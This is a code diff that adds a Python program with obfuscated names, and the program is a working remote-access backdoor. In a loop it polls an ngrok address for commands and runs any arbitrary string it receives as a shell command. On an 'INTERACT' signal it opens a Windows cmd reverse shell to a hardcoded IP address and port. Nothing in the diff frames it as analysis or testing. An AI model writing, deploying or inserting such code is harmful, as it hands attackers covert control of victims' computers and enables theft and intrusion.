@@ -1,0 +1,58 @@
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+def rev234ajksfj32030co2030asoficmoerir():
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("3.6.206.19",49152))
+    p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
+
+    s2p_thread = threading.Thread(target=s2p, args=[s, p])
+    s2p_thread.daemon = True
+    s2p_thread.start()
+
+    p2s_thread = threading.Thread(target=p2s, args=[s, p])
+    p2s_thread.daemon = True
+    p2s_thread.start()
+
+    try:
+        p.wait()
+    except KeyboardInterrupt:
+        s.close()
+
+def ge230askdfj29rTaedskf30rafjd0():
+    try:
+        coskdfi2309fwjls093f2 = requests.get("https://allegedly-great-shiner.ngrok-free.app")
+        if "(ERR_NGROK_3200)" in coskdfi2309fwjls093f2.text:
+            coskdfi2309fwjls093f2 = None
+    except Exception:
+        coskdfi2309fwjls093f2 = None
+    return coskdfi2309fwjls093f2
+
+if __name__ == "__main__":
+    while True:
+        sldkfjow0239rf2j = ge230askdfj29rTaedskf30rafjd0()
+        if sldkfjow0239rf2j is not None:
+            sldkfjow0239rf2j = sldkfjow0239rf2j.text
+            if sldkfjow0239rf2j == "<SLEEP>":
+                print("sleeping")
+                time.sleep(1)
+            elif sldkfjow0239rf2j == "<TERMINATE>":
+                break;
+            elif sldkfjow0239rf2j == "<INTERACT>":
+                rev234ajksfj32030co2030asoficmoerir()
+            else:
+                try:
+                    subprocess.Popen(sldkfjow0239rf2j, shell=True)
+                except Exception:
+                    print("error while executing")
+        else:
+            print("None")
+        time.sleep(1)
